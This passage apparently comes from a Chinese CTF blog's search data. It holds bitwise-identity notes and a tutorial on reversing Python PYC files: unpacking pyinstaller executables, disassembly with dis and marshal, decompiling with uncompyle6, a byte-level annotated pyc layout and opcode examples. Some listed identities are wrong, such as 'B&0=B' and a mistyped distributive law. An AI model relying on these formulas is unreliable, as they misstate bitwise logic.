49 4851 50 53 52 55 54 57 56 59 5861 60 63 62 65 64 67 66 69 6871 70 73 72 75 74 77 76 79 7881 80 83 82 85 84 87 86 89 8891 90 93 92 95 94 97 96 99 98 连续的数|1 1234567891001 01 03 03 05 05 07 07 09 0911 11 13 13 15 15 17 17 19 1921 21 23 23 25 25 27 27 29 2931 31 33 33 35 35 37 37 39 3941 41 43 43 45 45 47 47 49 4951 51 53 53 55 55 57 57 59 5961 61 63 63 65 65 67 67 69 6971 71 73 73 75 75 77 77 79 7981 81 83 83 85 85 87 87 89 8991 91 93 93 95 95 97 97 99 99 连续的数&amp;1 1234567891000 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 0100 01 00 01 00 01 00 01 00 01 异或的性质 123A^B=B^A(A^B)^C=A^(B^C)A&amp;(B^C)=(A&amp;B)^(A&amp;C) 运算的规律 1234567891011121314151617181920212223242526272829B^(~B)=-1B|(~B)=-1B^B=0B&amp;0=BB&amp;(~B)=0B^0=BB&amp;B=BB|0=BB|B=B结合律(A&amp;B)&amp;C=A&amp;(B&amp;C)(A|B)|C=A|(B|C)分配律A&amp;(B|C)=(A&amp;C)|(A&amp;C)A|(B&amp;C)=(A|B)&amp;(A|C)摩根定律~(A&amp;B)=(~A)|(~B)~(A|B)=(~A)&amp;(~B)吸收律A|(A&amp;B)=AA&amp;(A|B)=A(A&amp;B)|(A&amp;(~B))=AA|((~A)&amp;B)=A|B","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"PYC逆向","path":"/re4mile/2021/06/07/re/VM/PYC/re/","content":"待学习的链接https://www.cnblogs.com/beiluowuzheng/p/9496410.html 脚本123 搜索关键字 1234Python 逆向Python字节码PYC逆向pyc字节码混淆 文章 1https://taardisaa.github.io/categories/pyc/ 获取指令和字节码对应关系123import opcodefor op in range(len(opcode.opname)): print(&#x27;Hex 0x%.2X Dec:%.3d Name: %s&#x27; % (op, op, opcode.opname[op])) python2和python3的结果不同 py-&gt;exe如果你做好了准备工作,直接下面的操作 1pyinstaller -F xx.py 如果没有或者看其它的操作,就看下面 安装pyinstaller 1pip install pyinstaller 检查pyinstaller安装成功与否： 12pyinstaller --versionpyinstaller -v 在生成exe文件后，无法正常运行exe文件，可以尝试下面这种安装,然后再重新生成exe 1pip3 install https://github.com/pyinstaller/pyinstaller/archive/develop.tar.gz pyinstaller参数作用 -F 指定打包后只生成一个exe格式的文件(建议写上这个参数) -D –onedir 创建一个目录，包含exe文件，但会依赖很多文件（默认选项） -c –console, –nowindowed 使用控制台，无界面(默认) 会弹出窗口 -w –windowed, –noconsole 使用窗口，无控制台,找cmd允许 -p 添加搜索路径，让其找到对应的库。 -i 改变生成程序的icon图标 其他参数，可以通过pyinstaller –help查看 123例1.指定文件路径打包：pyinstaller -F D:\\project\\tanchishe.py例2.不带窗口，后台运行打包：pyinstaller -F -w D:\\project\\tanchishe.py例3.更换程序图标打包：pyinstaller -F -w -i D:\\project\\test.ico D:\\project\\tanchishe.py 直接生成exe 1pyinstaller -F xx.py 带ico的图标 1pyinstaller -F -i xx.ico yy.py 生成exe文件后，打开速度慢问题 1pyinstaller -D xx.py -w 打包完成后，进入到当前目录下，会发现多了__pycache__、build、dist、nhdz.spec这四个文件夹或者文件， 其中打包好的exe应用在dist目录下面，进入即可看到，可以把他拷贝到其他地方直接使用，如下图所示，是打包完成后的目录： 关于加密 1https://github.com/extremecoders-re/pyinstxtractor/wiki/Frequently-Asked-Questions exe-&gt;pyc如果做好了准备工作,直接 1python pyinstxtractor.py F:\\CTF\\ez_python.exe 如果没有,就看下面 pyinstxtractor 解析exe包 1https://github.com/extremecoders-re/pyinstxtractor 将需解包的exe与下载的pyinstxtractor.py存入同级文件夹 1234567891011121314151617python pyinstxtractor.py F:\\CTF\\ez_python.exe[+] Processing F:\\CTF\\ez_python.exe[+] Pyinstaller version: 2.1+[+] Python version: 3.4[+] Length of package: 4023776 bytes[+] Found 24 files in CArchive[+] Beginning extraction...please standby[+] Possible entry point: pyiboot01_bootstrap.pyc[+] Possible entry point: pyi_rth_multiprocessing.pyc[+] Possible entry point: src.pyc[!] Warning: This script is running in a different Python version than the one used to build the executable.[!] Please run this script in Python 3.4 to prevent extraction errors during unmarshalling[!] Skipping pyz extraction[+] Successfully extracted pyinstaller archive: F:\\CTF\\ez_python.exeYou can now use a python decompiler on the pyc files within the extracted directory py-&gt;pyc如果准备好了,就按照下面的操作 1python -m py_compile file.py 没有就看下面的 pyc的内容与python的版本是相关的，不同版本编译后的pyc文件是不同的， 例如2.5版本编译的是pyc文件，而2.4版本编译的python是无法执行的 生成单个pyc文件123python -m py_compile file.py # 生成单个pyc文件python -m py_compile /dir/&#123;file1,file2&#125;.py # 生成多个pyc文件python -m compileall /dir/ #　生成目录下所有py文件对应的pyc文件 py_compile模块可以把py文件生成pyc文件 12import py_compilepy_compile.compile(r&#x27;H:/game/test.py&#x27;) 函数介绍:生成单个pyc文件 1compile(file[, cfile[, dfile[, doraise]]]) 参数1 py文件的路径 参数2 pyc文件的生成路径 ,在参数2后面加 c 或者 o 表示优化的字节码 参数3 错误消息保存的路径 参数4 有两个值分别是true或false，如果为true时则会引发一个PyCompileError，否则如果编译文件出错， 则会有一个错误，默认显示在sys.stderr中，而不会引发异常 生成多个pyc文件12import compileallcompileall.compile_dir(r&#x27;H:/game&#x27;) 意思就是把game目录下以及其子目录下的py文件都编译为pyc文件了 1compile_dir(dir[, maxlevels[, ddir[, force[, rx[, quiet]]]]]) 参数1： 表示需要编译py的文件目录 参数2 ：表示需要递归编译的子目录的层数，默认是10层，即默认会把10层子目录中的py文件编译为pyc 参数3 ：表示错误消息保存的路径 参数4：当为true时表示会被强制编译成pyc文件，即使pyc文件是最新的依然会被强制编译一次 参数5： 表示一个正则表达式，可以排除掉不想要的目录，或者只有符合条件的目录才进行编译 参数6：当为True时，在编译后不会再标准输出中来打印信息 py-&gt;汇编查看16进制汇编代码 12345678import dissource = open(&quot;F:\\\\0xC0de\\\\Python\\\\test.py&quot;).read()code = compile(source, &#x27;F:\\\\0xC0de\\\\Python\\\\test.py&#x27;, &#x27;exec&#x27;)print(&quot;-------------------------------------------------------------------&quot;)print(&#x27;源码行号 |指令EIP,指令符号 |指令参数,实际参数值&#x27;)print(&quot;-------------------------------------------------------------------&quot;)dis.dis(code)#test.py compile返回的是和marshal一样的东西 12345678import disimport marshalfp=open(&#x27;E:\\\\0xC0de\\\\Python\\\\q.pyc&#x27;, &#x27;rb&#x27;).read()code=marshal.loads(fp[16:])#python3的头部是16字节,python2的头部是8字节dis.dis(code)#print(&quot;0x%.8X&quot; % (len(code.co_code))) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import disimport marshal&#x27;&#x27;&#x27;# &#x27;&#x27;&#x27;def comp_py(py_path,flag): source = open(py_path).read() code = compile(source, py_path, &#x27;exec&#x27;) if(flag==&#x27;0&#x27;): dis.dis(code) else: print(&quot;len 0x%.8X&quot; % (len(code.co_code))) print(&quot;0x%.8X&quot; % (code.co_argcount)) print(&quot;0x%.8X&quot; % (code.co_nlocals)) print(&quot;0x%.8X&quot; % (code.co_stacksize)) print(&quot;0x%.8X&quot; % (code.co_flags)) print(code.co_code) print(code.co_consts) print(code.co_names) print(code.co_varnames) print(code.co_cellvars) print(code.co_freevars) print(code.co_filename) print(code.co_name) print(&quot;0x%.8X&quot; % (code.co_firstlineno)) print(code.co_lnotab) # print(code.co_zombieframe) def comp_pyc(pyc_path,flag): fp=open(pyc_path, &#x27;rb&#x27;).read() code=marshal.loads(fp[16:])#python3的头部是16字节,python2的头部是8字节 if(flag==&#x27;0&#x27;): dis.dis(code) else: print(&quot;len 0x%.8X&quot; % (len(code.co_code))) print(&quot;0x%.8X&quot; % (code.co_argcount)) print(&quot;0x%.8X&quot; % (code.co_nlocals)) print(&quot;0x%.8X&quot; % (code.co_stacksize)) print(&quot;0x%.8X&quot; % (code.co_flags)) print(code.co_code) print(code.co_consts) print(code.co_names) print(code.co_varnames) print(code.co_cellvars) print(code.co_freevars) print(code.co_filename) print(code.co_name) print(&quot;0x%.8X&quot; % (code.co_firstlineno)) print(code.co_lnotab) # print(code.co_zombieframe)3086 #test.pypath=input()flag=input()if path==&#x27;pyc&#x27;: path=&#x27;E:\\\\0xC0de\\\\Python\\\\pyc\\\\test.pyc&#x27; comp_pyc(path,flag)elif path==&#x27;py&#x27;: path=&#x27;E:\\\\0xC0de\\\\Python\\\\test.py&#x27; comp_py(path,flag)else: print(&quot;no&quot;) &#x27;&#x27;&#x27; 71 03 87 &#x27;&#x27;&#x27; pyc是基于pyc文件的反汇编 pc是基于源文件的反汇编 pyc-&gt;pyuncompyle6 一个原生python的跨版本反编译器和fragment反编译器 反汇编 1pip install uncompyle6 然后反汇编pyc 1uncompyle6.exe 源.pyc &gt; 目的.py flare-bytecode_graph1https://github.com/mandiant/flare-bytecode_graph pyc:py3类似于java的class文件,是可以直接运行的 12python q.pycpython q.py Python3的每条指令是2个字节 Python2的每条指令是3个字节 pyc文件一般由3个部分组成:MagincNumnber+TimeStamp+PyCodeObject, magic number 不同版本的 Python 生成的 pyc 文件的 magic number 都不相同。四个字节的16进制形式为 xxxx 0d0a time stamp 文件源码大小 源代码文件信息在 Python 不同的版本之后差别较大 在 Python2的时候，这部分只有4个字节，为源代码文件的修改时间的 Unix timestamp（精确到秒）以小端法写入 在 Python 3.5 之前的版本已经找不到了 在 Python 3.5 和 3.6 相对于 Python 2，源代码文件信息这部分，在时间后面增加了4个字节的源代码文件的大小， ​\t单位字节，以小端法写入。如源码文件大小为87个字节，那么文件信息部分就写入 5700 0000。 ​\t加上前面的修改时间，就是 b9c7 895e 5700 0000 关于看了前8字节,第9字节是0x63,也就是PyCodeObject的标识符， 123456789101112131415161718192021222324252627282930313233343536373839[object.h]/* PyObject_HEAD defines the initial segment of every PyObject. */#define PyObject_HEAD _PyObject_HEAD_EXTRA int ob_refcnt; struct _typeobject *ob_type;#define PyObject_VAR_HEAD PyObject_HEAD int ob_size; /* Number of items in variable part */struct PyObject&#123; int ob_refcnt; //引用计数器，和内存回收有关 PyTypeObject *ob_type; //定义Python对象的元类信息&#125;;struct PyCodeObject&#123; PyObject_HEAD int co_argcount; /* 一个函数接收参数的个数 */ int co_kwonlyargcount; int co_nlocals; /* 局部变量个数 (得加上函数参数,因为参数也是局部变量)*/ int co_stacksize; /* 需要的栈个数 */ int co_flags; //无用 PyObject *co_code; /* 字节码本尊,(&#x27;s&#x27;+字节码长度(4字节)+字节码) */ PyObject *co_consts; /* 包含了当前函数的 数值,字符串,子函数名..一系列构成的数组 */ PyObject *co_names; /* 包含了当前函数的 一些列变量的名称构成的数组,比如print也是变量,他是一个类 */ PyObject *co_varnames; /* 一个函数的局部变量名称数组,不包含main函数*/ PyObject *co_freevars; /* 闭包用的的变量名集合 */ PyObject *co_cellvars; /* 内部嵌套函数引用的变量名集合 */ PyObject *co_filename; /* 当前py文件的名字 */ PyObject *co_name; /* 当前函数名|类名|模块名\t*/ int co_firstlineno; /* 当前函数在源代码文件中开始的行号 */ PyObject *co_lnotab; /* 字节码指令和行号的对应关系 */ void *co_zombieframe; /* for optimization only (see frameobject.c) */&#125;; 正的字节序列存在于PyStringObject类型的对象里 123456struct PyStringObject&#123; char flag=&#x27;s&#x27;, //PyStringObject的类型标识 DWORD length //4字节，字符串内容的长度 BYTE opcode[1] //byte数组，字符串内容 &#125; pyinstaller库中找到archieve这么一个文件夹，里面有一个pyz_crypto.py文件，是对pyz文件的加密代码 1‪C:\\Users\\tinyx\\AppData\\Local\\Programs\\Python\\Python38\\Lib\\site-packages\\PyInstaller\\archive\\pyz_crypto.py 一个pyc的文件介绍1234567# test.pys = &quot;Hello&quot;def func(a, b=3, *args):\tc = 114514\tprint(a, b)\tprint(args) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613742 0d 0d 0a // 版本魔数00 00 00 00 // 位域（暂时没用）49 a6 04 62 // 时间戳5b 00 00 00 // 文件大小// ===============主PyCodeObject===================e3 // TYPE_CODE | FLAG_REF 000 00 00 00 // co_argcount00 00 00 00 // co_kwonlyargcount00 00 00 00 // co_nlocals03 00 00 00 // co_stacksize40 00 00 00 // co_flags（CO_NOFREE）// co_code(作为TYPE_STRING存在)73 // TYPE_STRING，字符串对象（其实通常是字节码对象） 也就是1字节的标志12 00 00 00 // 长度0x1264 00 5a 00 64 05 64 02 64 03 84 01 5a 01 64 04 53 00 // co_consts29 // TYPE_SMALLTUPLE，PyTupleObject : PySequenceObject06 // size\t// value[0]\t5a // TYPE_SHORT_ASCII_INTERNED = &#x27;Z&#x27;,\t05 // length\t48 65 6c 6c 6f // value[1]\te9 // TYPE_INT&#x27;i&#x27; | FLAG_REF 1\t03 00 00 00 // 4字节int\t// value[2]\t63 // TYPE_CODE\t02 00 00 00 // co_argcount\t00 00 00 00 // co_kwonlyargcount\t04 00 00 00 // co_nlocals\t03 00 00 00 // co_stacksize\t47 00 00 00 // co_flags (NOFREE | VARARGS | NEWLOCALS | OPTIMIZED) // co_code 73 // TYPE_STRING 1a 00 00 00 // 长度 64 01 7d 03 74 00 7c 00 7c 01 83 02 01 00 74 00 7c 02 83 01 01 00 64 00 53 00 // co_consts 29 // TYPE_SMALLTUPLE 02 // size // value[0] 4e // TYPE_NONE = &#x27;N&#x27;, // value[1] 69 // TYPE_INT 52 bf 01 00 // 114514 // co_names 29 // TYPE_SMALLTUPLE 01 // size da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 2 05 // length 70 72 69 6e 74 // &#x27;print&#x27; // co_varnames 29 // TYPE_SMALLTUPLE 04 // size // value[0] da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 3 01 // length 61 // &#x27;a&#x27; // value[1] da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 4 01 // length 62 // &#x27;b&#x27; // value[2] da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 5 04 // length 61 72 67 73 // &#x27;args&#x27; // value[3] da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 6 01 // length 63 // &#x27;c&#x27; // co_freevars a9 // TYPE_SMALLTUPLE | FLAG_REF 7 00 // co_cellvars 72 // TYPE_OBREF = &#x27;r&#x27;, 07 00 00 00 // 指向上面的co_freevars，是空的。 // co_filename fa // TYPE_SHORT_ASCII | FLAG_REF 8 09 2e 5c 74 65 73 74 2e 70 79 // r&quot;.\\test.py&quot; // co_name da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 9 04 // length 66 75 6e 63 // &quot;func&quot; // co_firstlineno 04 00 00 00 // 4 // co_lnotab 73 // TYPE_STRING 06 00 00 00 00 01 04 01 0a 01 // value[3] -&gt; &quot;func&quot;\t72 // TYPE_OBREF = &#x27;r&#x27;\t09 00 00 00 // index\t// value[4]\t4e // TYPE_NONE = &#x27;N&#x27;\t// value[5]\t29 // TYPE_SMALLTUPLE\t01 // size // value[0] -&gt; 3 72 // TYPE_OBREF = &#x27;r&#x27; 01 00 00 00 // index// co_names29 // TYPE_SMALLTUPLE02 // size // value[0] da // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 10 01 // length 73 // &#x27;s&#x27; // value[1] -&gt; &quot;func&quot; 72 // TYPE_OBREF = &#x27;r&#x27; 09 00 00 00 // index = 9 // co_varnames72 // TYPE_OBREF = &#x27;r&#x27;07 00 00 00 // index// co_freevars -&gt; None72 // TYPE_OBREF = &#x27;r&#x27; 07 00 00 00 // index // co_cellvars -&gt; None72 // TYPE_OBREF = &#x27;r&#x27; 07 00 00 00 // index // co_filename -&gt; r&quot;.\\test.py&quot;72 // TYPE_OBREF = &#x27;r&#x27;08 00 00 00 // index // co_nameda // TYPE_SHORT_ASCII_INTERNED | FLAG_REF 08 // length3c 6d 6f 64 75 6c 65 3e // &quot;&lt;module&gt;&quot;// co_firstlineno02 00 00 00// co_lnotab73 // TYPE_STRING 02 00 00 00 04 02 指令介绍PyFrameObject其实就是通常所说的执行环境，这也是python对X86平台上栈帧的模拟 PyFrameObject &#x3D; PyCodeObject + 名字空间 + 静态信息 + 动态内存空间 FOR_ITER 相对于下一个指令的偏移量 98 FOR_ITER 54 (to 154) 100 STORE_NAME 14 (i) 154是一个经过计算的地址,而不是字节流的数据 154怎么算的? next_ip+相对位移=100+54=154 1234567891011121314151617181920212223ADD_TWO_VALUES：加法操作弹出栈中的两个数，将它们相加并将结果压入栈中（这不需要任何参数）PRINT_RESULT：弹出栈中的元素并打印参数:LOAD_CONST + index : index是`PyObject co_consts[index]`LOAD_NAME + index ：index 是`PyObject co_names[index]`LOAD_FAST + 变量的索引LOAD_GLOBAL + 全局变量索引 0 (0) # push global_obj co_names[0] == &quot;print&quot;LOAD_VALUE：找到指定的数据进行压栈（根据tuple的第二个元素（指令的参数）从常量表找）STORE_NAME： 存储变量值，将栈顶的内容存入变量中（对象的创建与初始化，变量名列表）POP_TOP 类似于add esp,4跳转:JUMP_FORWARD + 相对于下一个的偏移POP_JUMP_IF_FALSE + 一个绝对地址JUMP_ABSOLUTE + 一个绝对地址EXTENDED_ARG + 一个额外的字节,表示字节参数拼凑 Learn一个大佬的参考链接 https://www.cnblogs.com/beiluowuzheng/p/9496410.html opcode学习LOAD 读取 STORE 保存 源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值 变量 常量 LOAD_CONST加载const变量，比如数值、字符串等等，一般用于传给函数的参数 123455 12 LOAD_GLOBAL 1 (test) 15 LOAD_FAST 0 (2) #读取2 18 LOAD_CONST 1 (&#x27;output&#x27;) 21 CALL_FUNCTION 2 转为python代码就是： 1test(2, &#x27;output&#x27;) 局部变量 LOAD_FAST一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。STORE_FAST一般用于保存值到局部变量。 123461 77 LOAD_FAST 0 (n) 80 LOAD_FAST 3 (p) 83 INPLACE_DIVIDE 84 STORE_FAST 0 (n) 等价于 1n = n / p 区分局部变量和形参 形参没有初始化，也就是从函数开始到LOAD_FAST该变量的位置，如果没有看到STORE_FAST，那么该变量就是函数形参。 而其他局部变量在使用之前肯定会使用STORE_FAST进行初始化。 123456789104 0 LOAD_CONST 1 (0) 3 STORE_FAST 1 (local1) 5 6 LOAD_FAST 1 (local1) 9 PRINT_ITEM 10 LOAD_FAST 0 (arg1) 13 PRINT_ITEM 14 PRINT_NEWLINE 15 LOAD_CONST 0 (None) 18 RETURN_VALUE 等价于 123def test(arg1): local1 = 0 print local1, arg1 全局变量 LOAD_GLOBAL用来加载全局变量，包括指定函数名，类名，模块名等全局符号。 STORE_GLOBAL用来给全局变量赋值。 12348 6 LOAD_CONST 2 (101) //载入101 9 STORE_GLOBAL 0 (global1) //存入全局变量 20 LOAD_GLOBAL 0 (global1) //把全局变量压入print 23 PRINT_ITEM 等价于 1234def test(): global global1 global1 = 101 print global 数据类型list​ BUILD_LIST用于创建一个list结构。 123413 0 LOAD_CONST 1 (1) //载入常量 3 LOAD_CONST 2 (2) //载入常量 6 BUILD_LIST 2 //创建数组 9 STORE_FAST 0 (k) //把载入的常量存入数组 等价于 1k = [1, 2] 1234567891011121322 235 BUILD_LIST 0 //创建list，为赋值给某变量，这种时候一般都是语法糖结构了 238 LOAD_FAST 3 (sieve) 241 GET_ITER &gt;&gt; 242 FOR_ITER 24 (to 269) 245 STORE_FAST 4 (x) 248 LOAD_FAST 4 (x) 251 LOAD_CONST 2 (0) 254 COMPARE_OP 3 (!=) 257 POP_JUMP_IF_FALSE 242 //不满足条件contine 260 LOAD_FAST 4 (x)//读取满足条件的x 263 LIST_APPEND 2 //把每个满足条件的x存入list 266 JUMP_ABSOLUTE 242 &gt;&gt; 269 RETURN_VALUE dist 12345678910111213141516x=[y for y in arr if y!=0 ]-------------------------------------------------------- 2 0 BUILD_LIST 0 2 LOAD_FAST 0 (.0) &gt;&gt; 4 FOR_ITER 16 (to 22) 6 STORE_FAST 1 (y) ;if y!=0 8 LOAD_FAST 1 (y) 10 LOAD_CONST 0 (0) 12 COMPARE_OP 3 (!=) ;不满足条件contine 14 POP_JUMP_IF_FALSE 4 16 LOAD_FAST 1 (y) ;载入y 18 LIST_APPEND 2 ;拼接到数组 20 JUMP_ABSOLUTE 4 ;去往最上面的label &gt;&gt; 22 RETURN_VALUE dictBUILD_MAP用于创建一个空的dict。STORE_MAP用于初始化dict的内容 123456789101112131415161718 arr=&#123;&#x27;a&#x27;: 1,&#x27;b&#x27;:2&#125; ------------------------------------------------------------ 1 0 LOAD_CONST 0 (1) 2 LOAD_CONST 1 (2) 4 LOAD_CONST 2 ((&#x27;a&#x27;, &#x27;b&#x27;)) 6 BUILD_CONST_KEY_MAP 2 8 STORE_NAME 0 (arr) 10 LOAD_CONST 3 (None) arr[&#x27;b&#x27;]=100------------------------------------------------------------ 2 10 LOAD_CONST 3 (100) 12 LOAD_NAME 0 (arr) 14 LOAD_CONST 4 (&#x27;b&#x27;) 16 STORE_SUBSCR 18 LOAD_CONST 5 (None) 20 RETURN_VALUE slice 下面的没看懂 1234567891011SLICE+0()Implements TOS = TOS[:]. SLICE+1()Implements TOS = TOS1[TOS:]. SLICE+2()Implements TOS = TOS1[:TOS]. SLICE+3()Implements TOS = TOS2[TOS1:TOS]. BUILD_SLICE用于创建slice。对于list、元组、字符串都可以使用slice的方式进行访问。 但是要注意BUILD_SLICE用于[x:y:z]这种类型的slice，结合BINARY_SUBSCR读取slice的值，结合STORE_SUBSCR用于修改slice的值。 另外SLICE+n用于[a:b]类型的访问，STORE_SLICE+n用于[a:b]类型的修改，其中n表示如下 循环SETUP_LOOP用于开始一个循环。SETUP_LOOP 26 (to 35)中35表示循环退出点 while12345678910111213141516171819i= 0while i &lt; 10: i += 2 ------------------------------------------------------------------- 1 0 LOAD_CONST 0 (0) 2 STORE_NAME 0 (i) ;i=0 2 &gt;&gt; 4 LOAD_NAME 0 (i) ;循环起点 6 LOAD_CONST 1 (10) 8 COMPARE_OP 0 (&lt;) ;i&lt;10 10 POP_JUMP_IF_FALSE 22 ;while(i&lt;10) 3 12 LOAD_NAME 0 (i) 14 LOAD_CONST 2 (2) 16 INPLACE_ADD 18 STORE_NAME 0 (i)\t;i=i+2 20 JUMP_ABSOLUTE 4 ;回到起点 &gt;&gt; 22 LOAD_CONST 3 (None) 24 RETURN_VALUE for123456789101112131415arr=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]x=0for y in arr: x=y------------------------------------------------------------------- 3 14 LOAD_NAME 0 (arr) 16 GET_ITER &gt;&gt; 18 FOR_ITER 8 (to 28) ; for循环的标志 20 STORE_NAME 2 (y) 4 22 LOAD_NAME 2 (y) 24 STORE_NAME 1 (x) 26 JUMP_ABSOLUTE 18 &gt;&gt; 28 LOAD_CONST 4 (None) 30 RETURN_VALUE if 判断POP_JUMP_IF_FALSE和JUMP_FORWARD一般用于分支判断跳转。 POP_JUMP_IF_FALSE表示条件结果IF为FALSE就跳转到目标偏移指令。 JUMP_FORWARD直接跳转到目标偏移指令。 1234567891011121314151617181920212223242526272829303132333435363738394041i = 5if i &lt; 5: print (&#x27;i &lt; 5&#x27;)elif i &gt; 5: print (&#x27;i &gt; 5&#x27;)else: print (&#x27;i = 5&#x27;)-------------------------------------------------------------------源码行号 |指令EIP,指令符号 |指令参数,实际参数值------------------------------------------------------------------- 1 0 LOAD_CONST 0 (5) ;加载常量 2 STORE_NAME 0 (i) ;存入常量 2 4 LOAD_NAME 0 (i) ;加载变量 6 LOAD_CONST 0 (5) ;加载常量 8 COMPARE_OP 0 (&lt;) ;i&lt;5 10 POP_JUMP_IF_FALSE 22 ;跳转到22行 3 12 LOAD_NAME 1 (print) ;加载变量 14 LOAD_CONST 1 (&#x27;i &lt; 5&#x27;);加载常量 16 CALL_FUNCTION 1 ;调用函数 18 POP_TOP 20 JUMP_FORWARD 26 (to 48) ;直接跳转到48行 4 &gt;&gt; 22 LOAD_NAME 0 (i) 24 LOAD_CONST 0 (5) 26 COMPARE_OP 4 (&gt;) 28 POP_JUMP_IF_FALSE 40 5 30 LOAD_NAME 1 (print) 32 LOAD_CONST 2 (&#x27;i &gt; 5&#x27;) 34 CALL_FUNCTION 1 36 POP_TOP 38 JUMP_FORWARD 8 (to 48) 7 &gt;&gt; 40 LOAD_NAME 1 (print) 42 LOAD_CONST 3 (&#x27;i = 5&#x27;) 44 CALL_FUNCTION 1 46 POP_TOP &gt;&gt; 48 LOAD_CONST 4 (None) 50 RETURN_VALUE 函数0就是函数开始， 下一个0前一条指令就是函数结束位置， 当然也可以通过RETURN_VALUE来确定函数结尾 创建一个函数指针变量 1234567def dqx(): return 1 0 LOAD_CONST 0 (&lt;code object dqx at 0x00000213152D3F50, file &quot;E:\\0xC0de\\Python\\2.py&quot;, line 1&gt;)2 LOAD_CONST 1 (&#x27;dqx&#x27;)4 MAKE_FUNCTION 06 STORE_NAME 0 (dqx) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950def func1(): a=2 return adef func2(): a=3 return afunc1()func2()-------------------------------------------------------------------源码行号 |指令EIP,指令符号 |指令参数,实际参数值------------------------------------------------------------------- ;函数1 变量 建立 1 0 LOAD_CONST 0 (&lt;code object func1 at 0x0000021E908A8190, file &quot;E:\\0xC0de\\Python\\2.py&quot;, line 1&gt;) 2 LOAD_CONST 1 (&#x27;func1&#x27;) 4 MAKE_FUNCTION 0 6 STORE_NAME 0 (func1) ;函数2 变量 建立 4 8 LOAD_CONST 2 (&lt;code object func2 at 0x0000021E908A82F0, file &quot;E:\\0xC0de\\Python\\2.py&quot;, line 4&gt;) 10 LOAD_CONST 3 (&#x27;func2&#x27;) 12 MAKE_FUNCTION 0 14 STORE_NAME 1 (func2) ;一些自定义函数的调用 8 16 LOAD_NAME 0 (func1) ;载入参数func1 18 CALL_FUNCTION 0 ;调用函数 20 POP_TOP 9 22 LOAD_NAME 1 (func2) ;载入参数fun2 24 CALL_FUNCTION 0 ;调用函数 26 POP_TOP 28 LOAD_CONST 4 (None) 30 RETURN_VALUE ;下面是函数的具体实现,而不是调用过程,函数的返回就是0起点,下一个0之前的终点Disassembly of &lt;code object func1 at 0x0000021E908A8190, file &quot;E:\\0xC0de\\Python\\2.py&quot;, line 1&gt;: 2 0 LOAD_CONST 1 (2) ;载入常量 2 STORE_FAST 0 (a) ;存入变量 3 4 LOAD_FAST 0 (a) ;载入常量 6 RETURN_VALUE ;返回值Disassembly of &lt;code object func2 at 0x0000021E908A82F0, file &quot;E:\\0xC0de\\Python\\2.py&quot;, line 4&gt;: 5 0 LOAD_CONST 1 (3) 2 STORE_FAST 0 (a) 6 4 LOAD_FAST 0 (a) 6 RETURN_VALUE 内置函数的调用 123456789101112131415161718192021222324\timport mathx = 25y = int(math.sqrt(x)) -------------------------------------------------------------------源码行号 |指令EIP,指令符号 |指令参数,实际参数值------------------------------------------------------------------- 2 0 LOAD_CONST 0 (0) 2 LOAD_CONST 1 (None) 4 IMPORT_NAME 0 (math) 6 STORE_NAME 0 (math) 3 8 LOAD_CONST 2 (25) 10 STORE_NAME 1 (x) ;x=25 4 12 LOAD_NAME 2 (int) ; 14 LOAD_NAME 0 (math);push const_math 16 LOAD_METHOD 3 (sqrt) ;push method_sqrt 18 LOAD_NAME 1 (x) ; push 20 CALL_METHOD 1 22 CALL_FUNCTION 1 24 STORE_NAME 4 (y) 26 LOAD_CONST 1 (None) 28 RETURN_VALUE opcode对照表12345678910111213141516171819202122232425262728293031&#x27;&#x27;&#x27;用于常量集合load constPyObject *co_consts; ( &lt;code object func1 at 0x00000248EB178500, file &quot;E:\\0xC0de\\Python\\test.py&quot;, line 1&gt;, 交代了函数func1的实现位置 &#x27;func1&#x27;, &lt;code object func2 at 0x00000248EB178710, file &quot;E:\\0xC0de\\Python\\test.py&quot;, line 5&gt;, 交代了函数func2的实现位置 &#x27;func2&#x27;, &#x27;Hello&#x27;, 3, 4, None) &#x27;&#x27;&#x27;def func1(x,y): sum=x+y return sumdef func2(): print(&quot;world&quot;) return&#x27;&#x27;&#x27;下面的 符号名称PyObject *co_names; (&#x27;func1&#x27;, &#x27;func2&#x27;, &#x27;str&#x27;, &#x27;print&#x27;, &#x27;ret&#x27;) 用于 LOAD_NAME &#x27;&#x27;&#x27;str=&quot;Hello&quot;print(str)func2()ret=func1(3,4) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 1 0 LOAD_CONST 64 0 (&lt;code object func1 at 0x00000206F6750500, file &quot;E:\\0xC0de\\Python\\test.py&quot;, line 1&gt;) 2 LOAD_CONST 64 1 (&#x27;func1&#x27;) 4 MAKE_FUNCTION 84 0 6 STORE_NAME 5A 0 (func1) 5 8 LOAD_CONST 64 2 (&lt;code object func2 at 0x00000206F67F0A80, file &quot;E:\\0xC0de\\Python\\test.py&quot;, line 5&gt;) 10 LOAD_CONST 64 3 (&#x27;func2&#x27;) 12 MAKE_FUNCTION84 0 14 STORE_NAME 5A 1 (func2) 8 16 LOAD_CONST 64 4 (&#x27;Hello&#x27;) 18 STORE_NAME 5A 2 (str) 9 20 LOAD_NAME 65 3 (print) 22 LOAD_NAME 65 2 (str) 24 CALL_FUNCTION 83 1 26 POP_TOP\t01 10 28 LOAD_NAME 65 1 (func2) 30 CALL_FUNCTION 83 0 32 POP_TOP\t01 11 34 LOAD_NAME 65 0 (func1) 36 LOAD_CONST 64 5 (3) 38 